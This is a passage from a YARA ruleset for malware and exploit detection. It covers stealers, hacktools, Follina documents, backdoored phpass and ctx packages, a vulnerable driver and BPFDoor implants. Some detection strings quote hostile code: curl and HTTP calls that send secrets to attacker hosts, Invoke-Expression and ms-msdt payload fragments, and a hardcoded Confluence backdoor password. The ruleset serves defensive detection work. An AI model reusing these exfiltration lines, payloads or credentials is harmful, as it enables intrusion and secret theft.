\"8ce14c6b720281f43c75ce52e23ec13d08e7b2be1c5fbc2d704238f1fdd1a07f\"\n      hash2 = \"011c19d18fa446a2619b3a2512dacb2694e1da99a2c2ea7828769f1373ecd8fe\"\n      hash3 = \"418530bc7210f74ada8e7f16b41ea2033054e99f0c4423ce1d3ebf973c89e3a3\"\n      tags = \"DEMO, FILE, MAL, SUSP, T1020\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $sa1 = \"passwords.txt\" ascii\n      $sa2 = \"autofills/\" ascii\n      $sa3 = \"browsers/cookies/\" ascii\n      $sa4 = \"wallets/\" ascii\n      $sb1 = \"Passwords.txt\" ascii\n      $sb2 = \"Autofills/\" ascii\n      $sb3 = \"Browsers/Cookies/\" ascii\n      $sb4 = \"Wallets/\" ascii\n   condition: \n      uint16 ( 0 ) == 0x4b50 and filesize < 5000KB and ( 2 of ( $sa* ) or 2 of ( $sb* ) )\n}\n\nrule HKTL_Imphashes_Aug22_1_RID2EB5 : DEMO EXE FILE HKTL {\n   meta:\n      description = \"Detects different hacktools based on their imphash\"\n      author = \"Florian Roth\"\n      reference = \"Internal Research\"\n      date = \"2022-08-17 11:26:01\"\n      score = 80\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      modified = \"2023-03-21\"\n      tags = \"DEMO, EXE, FILE, HKTL\"\n      required_modules = \"pe\"\n      minimum_yara = \"3.2.0\"\n      \n   condition: \n      uint16 ( 0 ) == 0x5a4d and ( pe.imphash ( ) == \"bcca3c247b619dcd13c8cdff5f123932\" or pe.imphash ( ) == \"3a19059bd7688cb88e70005f18efc439\" or pe.imphash ( ) == \"bf6223a49e45d99094406777eb6004ba\" or pe.imphash ( ) == \"0c106686a31bfe2ba931ae1cf6e9dbc6\" or pe.imphash ( ) == \"0d1447d4b3259b3c2a1d4cfb7ece13c3\" or pe.imphash ( ) == \"1b0369a1e06271833f78ffa70ffb4eaf\" or pe.imphash ( ) == \"4c1b52a19748428e51b14c278d0f58e3\" or pe.imphash ( ) == \"4d927a711f77d62cebd4f322cb57ec6f\" or pe.imphash ( ) == \"66ee036df5fc1004d9ed5e9a94a1086a\" or pe.imphash ( ) == \"672b13f4a0b6f27d29065123fe882dfc\" or pe.imphash ( ) == \"6bbd59cea665c4afcc2814c1327ec91f\" or pe.imphash ( ) == \"725bb81dc24214f6ecacc0cfb36ad30d\" or pe.imphash ( ) == \"9528a0e91e28fbb88ad433feabca2456\" or pe.imphash ( ) == \"9da6d5d77be11712527dcab86df449a3\" or pe.imphash ( ) == \"a6e01bc1ab89f8d91d9eab72032aae88\" or pe.imphash ( ) == \"b24c5eddaea4fe50c6a96a2a133521e4\" or pe.imphash ( ) == \"d21bbc50dcc169d7b4d0f01962793154\" or pe.imphash ( ) == \"fcc251cceae90d22c392215cc9a2d5d6\" or pe.imphash ( ) == \"23867a89c2b8fc733be6cf5ef902f2d1\" or pe.imphash ( ) == \"a37ff327f8d48e8a4d2f757e1b6e70bc\" or pe.imphash ( ) == \"f9a28c458284584a93b14216308d31bd\" or pe.imphash ( ) == \"6118619783fc175bc7ebecff0769b46e\" or pe.imphash ( ) == \"959a83047e80ab68b368fdb3f4c6e4ea\" or pe.imphash ( ) == \"563233bfa169acc7892451f71ad5850a\" or pe.imphash ( ) == \"87575cb7a0e0700eb37f2e3668671a08\" or pe.imphash ( ) == \"13f08707f759af6003837a150a371ba1\" or pe.imphash ( ) == \"1781f06048a7e58b323f0b9259be798b\" or pe.imphash ( ) == \"233f85f2d4bc9d6521a6caae11a1e7f5\" or pe.imphash ( ) == \"24af2584cbf4d60bbe5c6d1b31b3be6d\" or pe.imphash ( ) == \"632969ddf6dbf4e0f53424b75e4b91f2\" or pe.imphash ( ) == \"713c29b396b907ed71a72482759ed757\" or pe.imphash ( ) == \"749a7bb1f0b4c4455949c0b2bf7f9e9f\" or pe.imphash ( ) == \"8628b2608957a6b0c6330ac3de28ce2e\" or pe.imphash ( ) == \"8b114550386e31895dfab371e741123d\" or pe.imphash ( ) == \"94cb940a1a6b65bed4d5a8f849ce9793\" or pe.imphash ( ) == \"9d68781980370e00e0bd939ee5e6c141\" or pe.imphash ( ) == \"b18a1401ff8f444056d29450fbc0a6ce\" or pe.imphash ( ) == \"cb567f9498452721d77a451374955f5f\" or pe.imphash ( ) == \"730073214094cd328547bf1f72289752\" or pe.imphash ( ) == \"17b461a082950fc6332228572138b80c\" or pe.imphash ( ) == \"dc25ee78e2ef4d36faa0badf1e7461c9\" or pe.imphash ( ) == \"819b19d53ca6736448f9325a85736792\" or pe.imphash ( ) == \"829da329ce140d873b4a8bde2cbfaa7e\" or pe.imphash ( ) == \"c547f2e66061a8dffb6f5a3ff63c0a74\" or pe.imphash ( ) == \"0588081ab0e63ba785938467e1b10cca\" or pe.imphash ( ) == \"0d9ec08bac6c07d9987dfd0f1506587c\" or pe.imphash ( ) == \"bc129092b71c89b4d4c8cdf8ea590b29\" or pe.imphash ( ) == \"4da924cf622d039d58bce71cdf05d242\" or pe.imphash ( ) == \"e7a3a5c377e2d29324093377d7db1c66\" or pe.imphash ( ) == \"9a9dbec5c62f0380b4fa5fd31deffedf\" or pe.imphash ( ) == \"af8a3976ad71e5d5fdfb67ddb8dadfce\" or pe.imphash ( ) == \"0c477898bbf137bbd6f2a54e3b805ff4\" or pe.imphash ( ) == \"0ca9f02b537bcea20d4ea5eb1a9fe338\" or pe.imphash ( ) == \"3ab3655e5a14d4eefc547f4781bf7f9e\" or pe.imphash ( ) == \"e6f9d5152da699934b30daab206471f6\" or pe.imphash ( ) == \"3ad59991ccf1d67339b319b15a41b35d\" or pe.imphash ( ) == \"ffdd59e0318b85a3e480874d9796d872\" or pe.imphash ( ) == \"0cf479628d7cc1ea25ec7998a92f5051\" or pe.imphash ( ) == \"07a2d4dcbd6cb2c6a45e6b101f0b6d51\" or pe.imphash ( ) == \"d6d0f80386e1380d05cb78e871bc72b1\" or pe.imphash ( ) == \"38d9e015591bbfd4929e0d0f47fa0055\" or pe.imphash ( ) == \"0e2216679ca6e1094d63322e3412d650\" or pe.imphash ( ) == \"ada161bf41b8e5e9132858cb54cab5fb\" or pe.imphash ( ) == \"2a1bc4913cd5ecb0434df07cb675b798\" or pe.imphash ( ) == \"11083e75553baae21dc89ce8f9a195e4\" or pe.imphash ( ) == \"a23d29c9e566f2fa8ffbb79267f5df80\" or pe.imphash ( ) == \"4a07f944a83e8a7c2525efa35dd30e2f\" or pe.imphash ( ) == \"767637c23bb42cd5d7397cf58b0be688\" or pe.imphash ( ) == \"14c4e4c72ba075e9069ee67f39188ad8\" or pe.imphash ( ) == \"3c782813d4afce07bbfc5a9772acdbdc\" or pe.imphash ( ) == \"7d010c6bb6a3726f327f7e239166d127\" or pe.imphash ( ) == \"89159ba4dd04e4ce5559f132a9964eb3\" or pe.imphash ( ) == \"6f33f4a5fc42b8cec7314947bd13f30f\" or pe.imphash ( ) == \"5834ed4291bdeb928270428ebbaf7604\" or pe.imphash ( ) == \"5a8a8a43f25485e7ee1b201edcbc7a38\" or pe.imphash ( ) == \"dc7d30b90b2d8abf664fbed2b1b59894\" or pe.imphash ( ) == \"41923ea1f824fe63ea5beb84db7a3e74\" or pe.imphash ( ) == \"3de09703c8e79ed2ca3f01074719906b\" or pe.imphash ( ) == \"a53a02b997935fd8eedcb5f7abab9b9f\" or pe.imphash ( ) == \"e96a73c7bf33a464c510ede582318bf2\" or pe.imphash ( ) == \"32089b8851bbf8bc2d014e9f37288c83\" or pe.imphash ( ) == \"09D278F9DE118EF09163C6140255C690\" or pe.imphash ( ) == \"03866661686829d806989e2fc5a72606\" or pe.imphash ( ) == \"e57401fbdadcd4571ff385ab82bd5d6d\" or pe.imphash ( ) == \"84B763C45C0E4A3E7CA5548C710DB4EE\" or pe.imphash ( ) == \"19584675d94829987952432e018d5056\" or pe.imphash ( ) == \"330768a4f172e10acb6287b87289d83b\" )\n}\n\nrule MAL_Github_Repo_Compromise_MyJino_Ru_Aug22_RID36DA : DEMO MAL RUSSIA {\n   meta:\n      description = \"Detects URL mentioned in report on compromised Github repositories in August 2022\"\n      author = \"Florian Roth\"\n      reference = \"https://twitter.com/stephenlacy/status/1554697077430505473\"\n      date = \"2022-08-03 17:13:31\"\n      score = 90\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, MAL, RUSSIA\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"curl http://ovz1.j19544519.pr46m.vps.myjino.ru\" ascii wide\n      $x2 = \"http__.Post(\\\"http://ovz1.j19544519.pr46m.vps.myjino.ru\" ascii wide\n   condition: \n      1 of them\n}\n\nrule VULN_PUA_GIGABYTE_Driver_Jul22_1_RID318F : DEMO VULN {\n   meta:\n      description = \"Detects a vulnerable GIGABYTE driver sometimes used by malicious actors to escalate privileges\"\n      author = \"Florian Roth\"\n      reference = \"https://twitter.com/malmoeb/status/1551449425842786306\"\n      date = \"2022-07-25 13:27:41\"\n      score = 65\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"31f4cfb4c71da44120752721103a16512444c13c2ac2d857a7e6f13cb679b427\"\n      tags = \"DEMO, VULN\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $xc1 = { 00 46 00 69 00 6C 00 65 00 56 00 65 00 72 00 73\n               00 69 00 6F 00 6E 00 00 00 00 00 35 00 2E 00 32\n               00 2E 00 33 00 37 00 39 00 30 00 2E 00 31 00 38\n               00 33 00 30 00 20 00 62 00 75 00 69 00 6C 00 74\n               00 20 00 62 00 79 00 3A 00 20 00 57 00 69 00 6E\n               00 44 00 44 00 4B 00 00 00 00 00 32 00 09 00 01\n               00 49 00 6E 00 74 00 65 00 72 00 6E 00 61 00 6C\n               00 4E 00 61 00 6D 00 65 00 00 00 67 00 64 00 72\n               00 76 00 2E 00 73 00 79 00 73 } \n      $x1 = \"AEYAaQBsAGUAVgBlAHIAcwBpAG8AbgAAAAAANQAuADIALgAzADcAOQAwAC4AMQA4ADMAMAAgAGIAdQBpAGwAdAAgAGIAeQA6ACAAVwBpAG4ARABEAEsAAAAAADIACQABAEkAbgB0AGUAcgBuAGEAbABOAGEAbQBlAAAAZwBkAHIAdgAuAHMAeQBz\" \n      $x2 = \"BGAGkAbABlAFYAZQByAHMAaQBvAG4AAAAAADUALgAyAC4AMwA3ADkAMAAuADEAOAAzADAAIABiAHUAaQBsAHQAIABiAHkAOgAgAFcAaQBuAEQARABLAAAAAAAyAAkAAQBJAG4AdABlAHIAbgBhAGwATgBhAG0AZQAAAGcAZAByAHYALgBzAHkAc\" \n      $x3 = \"ARgBpAGwAZQBWAGUAcgBzAGkAbwBuAAAAAAA1AC4AMgAuADMANwA5ADAALgAxADgAMwAwACAAYgB1AGkAbAB0ACAAYgB5ADoAIABXAGkAbgBEAEQASwAAAAAAMgAJAAEASQBuAHQAZQByAG4AYQBsAE4AYQBtAGUAAABnAGQAcgB2AC4AcwB5AH\" \n   condition: \n      filesize < 4000KB and 1 of them\n}\n\nrule VULN_Confluence_Questions_Plugin_CVE_2022_26138_Jul22_1_RID39F2 : CVE_2022_26138 DEMO VULN {\n   meta:\n      description = \"Detects properties file of Confluence Questions plugin with static user name and password (backdoor) CVE-2022-26138\"\n      author = \"Florian Roth\"\n      reference = \"https://www.bleepingcomputer.com/news/security/atlassian-fixes-critical-confluence-hardcoded-credentials-flaw/\"\n      date = \"2022-07-21 19:25:31\"\n      score = 50\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"CVE_2022_26138, DEMO, VULN\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x_plain_1 = \"predefined.user.password=disabled1system1user6708\" \n      $jar_marker = \"/confluence/plugins/questions/\" \n      $jar_size_1 = { 00 CC ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ??\n      /*    here starts default.properties v                          */\n                      ?? ?? ?? ?? ?? ?? 00 64 65 66 61 75 6C 74 2E 70\n                      72 6F 70 65 72 74 69 65 73 50 4B } \n      $jar_size_2 = { 00 CC 00 ?? ?? ?? ?? ?? 00 64 65 66 61 75 6C 74\n                      2E 70 72 6F 70 65 72 74 69 65 73 } \n   condition: \n      1 of ( $x* ) or ( $jar_marker and 1 of ( $jar_size* ) )\n}\n\nrule SUSP_ZIP_ISO_PhishAttachment_Pattern_Jun22_1_RID3719 : DEMO SUSP T1132_001 T1203 T1566_001 {\n   meta:\n      description = \"Detects suspicious small base64 encoded ZIP files (MIME email attachments) with .iso files as content as often used in phishing attacks\"\n      author = \"Florian Roth\"\n      reference = \"Internal Research\"\n      date = \"2022-06-23 17:24:01\"\n      score = 65\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, SUSP, T1132_001, T1203, T1566_001\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $pkzip_base64_1 = { 0A 55 45 73 44 42 } \n      $pkzip_base64_2 = { 0A 55 45 73 44 42 } \n      $pkzip_base64_3 = { 0A 55 45 73 48 43 } \n      $iso_1 = \"Lmlzb1BL\" \n      $iso_2 = \"5pc29QS\" \n      $iso_3 = \"uaXNvUE\" \n   condition: \n      filesize < 2000KB and 1 of ( $pk* ) and 1 of ( $iso* )\n}\n\nrule SUSP_LNK_Follina_Jun22_RID2EB4 : CVE_2022_30190 DEMO FILE SUSP T1210 T1547_009 {\n   meta:\n      description = \"Detects LNK files with suspicious Follina / CVE-2022-30190 strings\"\n      author = \"Paul Hager\"\n      reference = \"https://twitter.com/gossithedog/status/1531650897905950727\"\n      date = \"2022-06-02 11:25:51\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"CVE_2022_30190, DEMO, FILE, SUSP, T1210, T1547_009\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $sa1 = \"msdt.exe\" ascii wide\n      $sa2 = \"msdt \" ascii wide\n      $sa3 = \"ms-msdt:\" ascii wide\n      $sb = \"IT_BrowseForFile=\" ascii wide\n   condition: \n      filesize < 5KB and uint16 ( 0 ) == 0x004c and uint32 ( 4 ) == 0x00021401 and 1 of ( $sa* ) and $sb\n}\n\nrule SUSP_Doc_RTF_OLE2Link_Jun22_RID300B : DEMO FILE SUSP {\n   meta:\n      description = \"Detects a suspicious pattern in RTF files which downloads external resources\"\n      author = \"Christian Burkard\"\n      reference = \"Internal Research\"\n      date = \"2022-06-01 12:23:01\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, FILE, SUSP\"\n      minimum_yara = \"3.2.0\"\n      \n   strings:\n      $sa = \"\\\\objdata\" ascii nocase\n      $sb1 = \"4f4c45324c696e6b\" ascii\n      $sb2 = \"4F4C45324C696E6B\" ascii\n      $sc1 = \"d0cf11e0a1b11ae1\" ascii\n      $sc2 = \"D0CF11E0A1B11AE1\" ascii\n      $x1 = \"68007400740070003a002f002f00\" ascii\n      $x2 = \"68007400740070003A002F002F00\" ascii\n      $x3 = \"680074007400700073003a002f002f00\" ascii\n      $x4 = \"680074007400700073003A002F002F00\" ascii\n      $x5 = \"6600740070003a002f002f00\" ascii\n      $x6 = \"6600740070003A002F002F00\" ascii\n   condition: \n      ( uint32be ( 0 ) == 0x7B5C7274 or uint32be ( 0 ) == 0x7B5C2A5C ) and $sa and 1 of ( $sb* ) and 1 of ( $sc* ) and 1 of ( $x* )\n}\n\nrule SUSP_Doc_RTF_OLE2Link_EMAIL_Jun22_RID31D2 : DEMO SUSP {\n   meta:\n      description = \"Detects a suspicious pattern in RTF files which downloads external resources inside e-mail attachments\"\n      author = \"Christian Burkard\"\n      reference = \"Internal Research\"\n      date = \"2022-06-01 13:38:51\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, SUSP\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $sa1 = \"XG9iamRhdG\" ascii\n      $sa2 = \"xvYmpkYXRh\" ascii\n      $sa3 = \"cb2JqZGF0Y\" ascii\n      $sb1 = \"NGY0YzQ1MzI0YzY5NmU2Y\" ascii\n      $sb2 = \"RmNGM0NTMyNGM2OTZlNm\" ascii\n      $sb3 = \"0ZjRjNDUzMjRjNjk2ZTZi\" ascii\n      $sb4 = \"NEY0QzQ1MzI0QzY5NkU2Q\" ascii\n      $sb5 = \"RGNEM0NTMyNEM2OTZFNk\" ascii\n      $sb6 = \"0RjRDNDUzMjRDNjk2RTZC\" ascii\n      $sc1 = \"ZDBjZjExZTBhMWIxMWFlM\" ascii\n      $sc2 = \"QwY2YxMWUwYTFiMTFhZT\" ascii\n      $sc3 = \"kMGNmMTFlMGExYjExYWUx\" ascii\n      $sc4 = \"RDBDRjExRTBBMUIxMUFFM\" ascii\n      $sc5 = \"QwQ0YxMUUwQTFCMTFBRT\" ascii\n      $sc6 = \"EMENGMTFFMEExQjExQUUx\" ascii\n      $x1 = \"NjgwMDc0MDA3NDAwNzAwMDNhMDAyZjAwMmYwM\" ascii\n      $x2 = \"Y4MDA3NDAwNzQwMDcwMDAzYTAwMmYwMDJmMD\" ascii\n      $x3 = \"2ODAwNzQwMDc0MDA3MDAwM2EwMDJmMDAyZjAw\" ascii\n      $x4 = \"NjgwMDc0MDA3NDAwNzAwMDNBMDAyRjAwMkYwM\" ascii\n      $x5 = \"Y4MDA3NDAwNzQwMDcwMDAzQTAwMkYwMDJGMD\" ascii\n      $x6 = \"2ODAwNzQwMDc0MDA3MDAwM0EwMDJGMDAyRjAw\" ascii\n      $x7 = \"NjgwMDc0MDA3NDAwNzAwMDczMDAzYTAwMmYwMDJmMD\" ascii\n      $x8 = \"Y4MDA3NDAwNzQwMDcwMDA3MzAwM2EwMDJmMDAyZjAw\" ascii\n      $x9 = \"2ODAwNzQwMDc0MDA3MDAwNzMwMDNhMDAyZjAwMmYwM\" ascii\n      $x10 = \"NjgwMDc0MDA3NDAwNzAwMDczMDAzQTAwMkYwMDJGMD\" ascii\n      $x11 = \"Y4MDA3NDAwNzQwMDcwMDA3MzAwM0EwMDJGMDAyRjAw\" ascii\n      $x12 = \"2ODAwNzQwMDc0MDA3MDAwNzMwMDNBMDAyRjAwMkYwM\" ascii\n      $x13 = \"NjYwMDc0MDA3MDAwM2EwMDJmMDAyZjAw\" ascii\n      $x14 = \"Y2MDA3NDAwNzAwMDNhMDAyZjAwMmYwM\" ascii\n      $x15 = \"2NjAwNzQwMDcwMDAzYTAwMmYwMDJmMD\" ascii\n      $x16 = \"NjYwMDc0MDA3MDAwM0EwMDJGMDAyRjAw\" ascii\n      $x17 = \"Y2MDA3NDAwNzAwMDNBMDAyRjAwMkYwM\" ascii\n      $x18 = \"2NjAwNzQwMDcwMDAzQTAwMkYwMDJGMD\" ascii\n   condition: \n      filesize < 10MB and 1 of ( $sa* ) and 1 of ( $sb* ) and 1 of ( $sc* ) and 1 of ( $x* )\n}\n\nrule SUSP_DOC_RTF_ExternalResource_EMAIL_Jun22_RID357D : CVE_2022_30190 DEMO SUSP {\n   meta:\n      description = \"Detects a suspicious pattern in RTF files which downloads external resources as seen in CVE-2022-30190 / Follina inside e-mail attachment\"\n      author = \"Christian Burkard\"\n      reference = \"https://doublepulsar.com/follina-a-microsoft-office-code-execution-vulnerability-1a47fce5629e\"\n      date = \"2022-06-01 16:15:21\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"CVE_2022_30190, DEMO, SUSP\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $sa1 = \"PFJlbGF0aW9uc2hpcH\" ascii\n      $sa2 = \"xSZWxhdGlvbnNoaXBz\" ascii\n      $sa3 = \"8UmVsYXRpb25zaGlwc\" ascii\n      $sb1 = \"VGFyZ2V0TW9kZT0iRXh0ZXJuYWwi\" ascii\n      $sb2 = \"RhcmdldE1vZGU9IkV4dGVybmFsI\" ascii\n      $sb3 = \"UYXJnZXRNb2RlPSJFeHRlcm5hbC\" ascii\n      $sc1 = \"Lmh0bWwhI\" ascii\n      $sc2 = \"5odG1sIS\" ascii\n      $sc3 = \"uaHRtbCEi\" ascii\n   condition: \n      filesize < 400KB and 1 of ( $sa* ) and 1 of ( $sb* ) and 1 of ( $sc* )\n}\n\nrule SUSP_Msdt_Artefact_Jun22_2_RID305D : CVE_2022_30190 DEMO FILE SUSP {\n   meta:\n      description = \"Detects suspicious pattern in msdt diagnostics log (e.g. CVE-2022-30190)\"\n      author = \"Christian Burkard\"\n      reference = \"https://twitter.com/nas_bench/status/1531718490494844928\"\n      date = \"2022-06-01 12:36:41\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      modified = \"2022-07-29\"\n      tags = \"CVE_2022_30190, DEMO, FILE, SUSP\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $a1 = \"<ScriptError><Data id=\\\"ScriptName\\\" name=\\\"Script\\\">TS_ProgramCompatibilityWizard.ps1\" ascii\n      $x1 = \"/../../\" ascii\n      $x2 = \"$(Invoke-Expression\" ascii\n      $x3 = \"$(IEX(\" ascii nocase\n   condition: \n      uint32 ( 0 ) == 0x6D783F3C and $a1 and 1 of ( $x* )\n}\n\nrule EXPL_Follina_CVE_2022_30190_Msdt_MSProtocolURI_May22_RID384E : CVE_2022_30190 DEMO EXPLOIT {\n   meta:\n      description = \"Detects the malicious usage of the ms-msdt URI as seen in CVE-2022-30190 / Follina exploitation\"\n      author = \"Tobias Michalski, Christian Burkard\"\n      reference = \"https://doublepulsar.com/follina-a-microsoft-office-code-execution-vulnerability-1a47fce5629e\"\n      date = \"2022-05-30 18:15:31\"\n      score = 80\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      modified = \"2022-07-18\"\n      hash1 = \"4a24048f81afbe9fb62e7a6a49adbd1faf41f266b5f9feecdceb567aec096784\"\n      hash2 = \"778cbb0ee4afffca6a0b788a97bc2f4855ceb69ddc5eaa230acfa2834e1aeb07\"\n      tags = \"CVE_2022_30190, DEMO, EXPLOIT\"\n      minimum_yara = \"2.2.0\"\n      \n   strings:\n      $re1 = /location\\.href\\s{0,20}=\\s{0,20}\"ms-msdt:/ \n      $a1 = \"%6D%73%2D%6D%73%64%74%3A%2F\" ascii\n   condition: \n      filesize > 3KB and filesize < 100KB and 1 of them\n}\n\nrule SUSP_Doc_WordXMLRels_May22_RID303D : CVE_2022_30190 DEMO SUSP {\n   meta:\n      description = \"Detects a suspicious pattern in docx document.xml.rels file as seen in CVE-2022-30190 / Follina exploitation\"\n      author = \"Tobias Michalski, Christian Burkard, Wojciech Cieslak\"\n      reference = \"https://doublepulsar.com/follina-a-microsoft-office-code-execution-vulnerability-1a47fce5629e\"\n      date = \"2022-05-30 12:31:21\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      modified = \"2022-06-20\"\n      tags = \"CVE_2022_30190, DEMO, SUSP\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $a1 = \"<Relationships\" ascii\n      $a2 = \"TargetMode=\\\"External\\\"\" ascii\n      $x1 = \".html!\" ascii\n      $x2 = \".htm!\" ascii\n      $x3 = \"%2E%68%74%6D%6C%21\" ascii\n      $x4 = \"%2E%68%74%6D%21\" ascii\n   condition: \n      filesize < 50KB and all of ( $a* ) and 1 of ( $x* )\n}\n\nrule SUSP_Doc_RTF_ExternalResource_May22_RID33F0 : CVE_2022_30190 DEMO FILE SUSP {\n   meta:\n      description = \"Detects a suspicious pattern in RTF files which downloads external resources as seen in CVE-2022-30190 / Follina exploitation\"\n      author = \"Tobias Michalski, Christian Burkard\"\n      reference = \"https://doublepulsar.com/follina-a-microsoft-office-code-execution-vulnerability-1a47fce5629e\"\n      date = \"2022-05-30 15:09:11\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      modified = \"2022-05-31\"\n      tags = \"CVE_2022_30190, DEMO, FILE, SUSP\"\n      minimum_yara = \"3.2.0\"\n      \n   strings:\n      $s1 = \" LINK htmlfile \\\"http\" ascii\n      $s2 = \".html!\\\" \" ascii\n   condition: \n      uint32be ( 0 ) == 0x7B5C7274 and filesize < 300KB and all of them\n}\n\nrule VULN_PHP_Hack_Backdoored_Phpass_May21_RID3477 : DEMO VULN {\n   meta:\n      description = \"Detects backdoored PHP phpass version\"\n      author = \"Christian Burkard\"\n      reference = \"https://twitter.com/s0md3v/status/1529005758540808192\"\n      date = \"2022-05-24 15:31:41\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, VULN\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"file_get_contents(\\\"http://anti-theft-web.herokuapp.com/hacked/$access/$secret\\\")\" ascii\n   condition: \n      filesize < 30KB and $x1\n}\n\nrule VULN_Python_Hack_Backdoored_Ctx_May21_RID34D1 : DEMO SCRIPT T1059_006 VULN {\n   meta:\n      description = \"Detects backdoored python ctx version\"\n      author = \"Christian Burkard\"\n      reference = \"https://twitter.com/s0md3v/status/1529005758540808192\"\n      date = \"2022-05-24 15:46:41\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"4fdfd4e647c106cef2a3b2503473f9b68259cae45f89e5b6c9272d04a1dfaeb0\"\n      hash2 = \"b40297af54e3f99b02e105f013265fd8d0a1b1e1f7f0b05bcb5dbdc9125b3bb5\"\n      hash3 = \"b7644fa1e0872780690ce050c98aa2407c093473031ab5f7a8ce35c0d2fc077e\"\n      tags = \"DEMO, SCRIPT, T1059_006, VULN\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"requests.get(\\\"https://anti-theft-web.herokuapp.com/hacked/\" \n   condition: \n      filesize < 10KB and $x1\n}\n\nrule APT_MAL_LNX_RedMenshen_BPFDoor_Controller_May22_3_RID3892 : APT CHINA DEMO LINUX MAL {\n   meta:\n      description = \"Detects BPFDoor implants used by Chinese actor Red Menshen\"\n      author = \"Florian Roth\"\n      reference = \"https://doublepulsar.com/bpfdoor-an-active-chinese-global-surveillance-tool-54b078f1a896\"\n      date = \"2022-05-08 18:26:51\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"144526d30ae747982079d5d340d1ff116a7963aba2e3ed589e7ebc297ba0c1b3\"\n      hash2 = \"fa0defdabd9fd43fe2ef1ec33574ea1af1290bd3d763fdb2bed443f2bd996d73\"\n      tags = \"APT, CHINA, DEMO, LINUX, MAL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"hald-addon-acpi: listening on acpi kernel interface /proc/acpi/event\" ascii fullword\n      $s2 = \"/sbin/mingetty /dev\" ascii fullword\n      $s3 = \"pickup -l -t fifo -u\" ascii fullword\n   condition: \n      uint16 ( 0 ) == 0x457f and filesize < 200KB and 2 of them or all of them\n}\n\nrule APT_MAL_LNX_RedMenshen_BPFDoor_Controller_May22_2_RID3891 : APT CHINA DEMO LINUX MAL {\n   meta:\n      description = \"Detects BPFDoor implants used by Chinese actor Red Menshen\"\n      author = \"Florian Roth\"\n      reference = \"https://doublepulsar.com/bpfdoor-an-active-chinese-global-surveillance-tool-54b078f1a896\"\n      date = \"2022-05-07 18:26:41\"\n      score = 85\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"76bf736b25d5c9aaf6a84edd4e615796fffc338a893b49c120c0b4941ce37925\"\n      hash2 = \"96e906128095dead57fdc9ce8688bb889166b67c9a1b8fdb93d7cff7f3836bb9\"\n      hash3 = \"c80bd1c4a796b4d3944a097e96f384c85687daeedcdcf05cc885c8c9b279b09c\"\n      tags = \"APT, CHINA, DEMO, LINUX, MAL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $opx1 = { 48 83 c0 0c 48 8b 95 e8 fe ff ff 48 83 c2 0c 8b 0a 8b 55 f0 01 ca 89 10 c9 } \n      $opx2 = { 48 01 45 e0 83 45 f4 01 8b 45 f4 3b 45 dc 7c cd c7 45 f4 00 00 00 00 eb 2? 48 8b 05 ?? ?? 20 00 } \n      $op1 = { 48 8d 14 c5 00 00 00 00 48 8b 45 d0 48 01 d0 48 8b 00 48 89 c7 e8 ?? ?? ff ff 48 83 c0 01 48 01 45 e0 } \n      $op2 = { 89 c2 8b 85 fc fe ff ff 01 c2 8b 45 f4 01 d0 2d 7b cf 10 2b 89 45 f4 c1 4d f4 10 } \n      $op3 = { e8 ?? d? ff ff 8b 45 f0 eb 12 8b 85 3c ff ff ff 89 c7 e8 ?? d? ff ff b8 ff ff ff ff c9 } \n   condition: \n      uint16 ( 0 ) == 0x457f and filesize < 100KB and 2 of ( $opx* ) or 4 of them\n}\n\nrule APT_MAL_LNX_RedMenshen_BPFDoor_Controller_May22_1_RID3890 : APT DEMO LINUX MAL T1070_003 {\n   meta:\n      description = \"Detects unknown Linux implants (uploads from KR and MO)\"\n      author = \"Florian Roth\"\n      reference = 